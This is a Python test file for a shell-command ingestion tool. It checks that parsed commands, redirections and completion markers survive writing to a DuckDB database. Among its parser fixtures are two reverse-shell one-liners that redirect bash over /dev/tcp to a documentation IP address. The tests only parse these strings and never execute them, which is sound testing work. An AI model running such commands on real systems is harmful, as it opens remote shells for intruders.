"""Verify shell fields and complete-run markers through the real database writer."""
import json

import duckdb
from test_ingest_batches import invoke


def test_shell_fields_roundtrip(tmp_path):
    """Parser upgrades must retain redirections, duplicates, and source positions."""
    inputs = ['cd ..; X=y ls "docs a" > /dev/null', 'echo same same | cat same',
              'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1', 'echo "|" $(id)',
              'cat <<EOF\nhello world\nEOF', 'echo a\\\nb']
    source = f'''
from _ingest import shell_commands, command_table
INPUTS = {inputs!r}
def records(root, options):
    for i, text in enumerate(INPUTS):
        commands = [Command(pgm, args, f'{{i}}:{{j}}', shell_input=text, other_tokens=other)
                    for j, (pgm, args, other) in enumerate(shell_commands(text))]
        yield command_table(commands, root.name)
    yield Command('/bin/sh', ['-c', 'echo x > y'], 'native')
'''
    database = tmp_path / 'commands.duckdb'
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        rows = {r[0]: r[1:] for r in con.execute('SELECT record_id,pgm,args,shell_input,other_tokens FROM COMMANDS').fetchall()}
        assert rows['0:1'] == ('ls', ['docs a'], inputs[0], ['cd', '..', ';', 'X=y', '>', '/dev/null'])
        assert rows['1:0'][3] == ['|', 'cat', 'same']
        assert rows['2:0'][3] == ['>&', '/dev/tcp/192.0.2.1/4444', '0', '>&', '1']
        assert rows['3:0'][1] == ['|', '$(id)']
        assert rows['3:1'][0] == 'id'
        assert rows['4:0'][1] == []
        assert rows['4:0'][3] == ['<<', 'EOF', 'hello world\n', 'EOF']
        assert rows['5:0'][1] == ['ab']
        assert rows['native'][2:] == (None, [])
        assert [row[0] for row in con.execute('DESCRIBE COMMANDS').fetchall()] == [
            'pgm', 'pgm_base', 'args', 'shell_input', 'other_tokens', 'dataset', 'record_id', 'label', 'group_id', 'session_id', 'os']
    again = invoke(tmp_path, database, source)
    assert json.loads(again.stdout)['skipped']


def test_sample_is_retryable(tmp_path):
    """A bounded inspection must not prevent a later complete release import."""
    source = "def records(root, options):\n    yield Command('id', [], '1')\n    yield Command('ls', [], '2')\n"
    database = tmp_path / 'commands.duckdb'
    result = invoke(tmp_path, database, source, '--limit', '1')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (False,)
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT count(*) FROM COMMANDS').fetchone() == (2,)
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (True,)


def test_old_complete_database_requires_reingestion(tmp_path):
    """Old completion markers must not silently bypass the changed table format."""
    database = tmp_path / 'old.duckdb'
    with duckdb.connect(str(database)) as con:
        con.execute('CREATE TABLE COMMANDS(pgm VARCHAR)')
        con.execute("INSERT INTO COMMANDS VALUES ('saved')")
        con.execute('CREATE TABLE INGESTED(dataset VARCHAR, ingested BOOLEAN)')
        con.execute('INSERT INTO INGESTED VALUES (?, true)', [tmp_path.name])
    result = invoke(tmp_path, database, "def records(root, options):\n    return []\n")
    assert result.returncode != 0
    assert 'Use --db with a new database' in result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT * FROM COMMANDS').fetchall() == [('saved',)]


def test_redirection_descriptor_is_not_an_execution(tmp_path):
    """Detect tree-sitter-bash treating a descriptor-only redirect as a program."""
    source = """
from _ingest import shell_commands
def records(root, options):
    text = '0<&3; exec 3<>/dev/tcp/192.0.2.1/4444; bash <&3 >&3 2>&3; foo 0<&3; 0<&3 /bin/bash -i'
    for i, (pgm, args, other) in enumerate(shell_commands(text)):
        yield Command(pgm, args, str(i), shell_input=text, other_tokens=other)
"""
    database = tmp_path / 'commands.duckdb'
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        assert con.execute('SELECT pgm,args FROM COMMANDS ORDER BY record_id').fetchall() == [('bash', []), ('foo', []), ('/bin/bash', ['-i'])], 'Descriptor-only exec changes the shell; it does not launch a program'
